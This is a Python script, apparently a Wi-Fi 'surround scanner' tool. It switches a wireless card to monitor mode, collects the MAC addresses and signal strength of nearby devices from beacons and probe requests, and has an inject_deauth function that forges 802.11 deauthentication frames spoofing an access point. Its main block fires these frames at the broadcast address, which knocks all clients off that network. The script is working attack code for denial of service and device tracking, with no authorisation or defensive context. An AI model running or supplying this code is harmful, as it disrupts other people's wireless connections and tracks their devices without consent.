#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import time

class WifiSurroundScanner:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.mon_interface = f"{interface}mon"
        self.is_sniffing = False
        self.discovered_macs = set()
        self.lock = threading.Lock()

    def start_monitor_mode(self):
        """Put wireless interface into monitor mode using standard iw tools."""
        print(f"[SURROUND] Initializing monitor mode on {self.interface}...")
        try:
            # Check if iw or airmon-ng is available
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
            subprocess.run(["sudo", "airmon-ng", "start", self.interface], check=True)
            print(f"[PASS] Monitor mode interface created: {self.mon_interface}")
            return True
        except Exception as e:
            print(f"[FAIL] Failed to configure monitor mode: {e}. (Run locally without monitor Wi-Fi card?)")
            return False

    def stop_monitor_mode(self):
        """Revert monitor mode interfaces."""
        try:
            subprocess.run(["sudo", "airmon-ng", "stop", self.mon_interface], check=True)
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=True)
            print("[PASS] Monitor mode halted. NetworkManager restarted.")
        except Exception as e:
            print(f"[ERR] Reverting interfaces failed: {e}")

    def sniff_packets(self, duration=10):
        """Uses scapy to sniff 802.11 management beacons and probe requests."""
        try:
            from scapy.all import sniff, Dot11Beacon, Dot11ProbeReq
        except ImportError:
            print("[SURROUND] Scapy library not installed! Run: pip install scapy")
            return
            
        print(f"[SURROUND] Sniffing network packets on {self.mon_interface} for {duration} seconds...")
        self.is_sniffing = True
        self.discovered_macs.clear()

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeReq):
                mac = pkt.addr2 # Source MAC
                if mac not in self.discovered_macs:
                    with self.lock:
                        self.discovered_macs.add(mac)
                        print(f"[SURROUND] Captured Device MAC: {mac} (RSSI: {pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 'N/A'} dBm)")

        # Run non-blocking sniff
        t = threading.Thread(
            target=lambda: sniff(iface=self.mon_interface, prn=packet_handler, timeout=duration, store=0),
            daemon=True
        )
        t.start()
        time.sleep(duration)
        self.is_sniffing = False
        print(f"[SURROUND] Sniff complete. Discovered {len(self.discovered_macs)} unique devices.")

    def inject_deauth(self, target_mac: str, ap_mac: str, count=50):
        """Inject 802.11 Deauthentication frames to disconnect a target device from an Access Point."""
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
        except ImportError:
            print("[SURROUND] Scapy not available.")
            return False

        print(f"[SURROUND] Injecting {count} Deauth frames targeting {target_mac} on AP {ap_mac}...")
        
        # Build 802.11 Deauth frame
        # addr1: Receiver MAC, addr2: Source MAC (AP), addr3: BSSID (AP)
        pkt = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
        
        try:
            sendp(pkt, iface=self.mon_interface, count=count, inter=0.1, verbose=False)
            print("[PASS] Deauth injection sequence sent.")
            return True
        except Exception as e:
            print(f"[FAIL] Packet injection failed: {e}")
            return False

if __name__ == "__main__":
    scanner = WifiSurroundScanner()
    if scanner.start_monitor_mode():
        scanner.sniff_packets(duration=5)
        # Mock deauth targeting broadcast frame
        scanner.inject_deauth("FF:FF:FF:FF:FF:FF", "00:11:22:33:44:55", count=5)
        scanner.stop_monitor_mode()
    else:
        print("[SURROUND] Executing mock scan. Captured MAC: 00:AA:BB:CC:DD:EE")
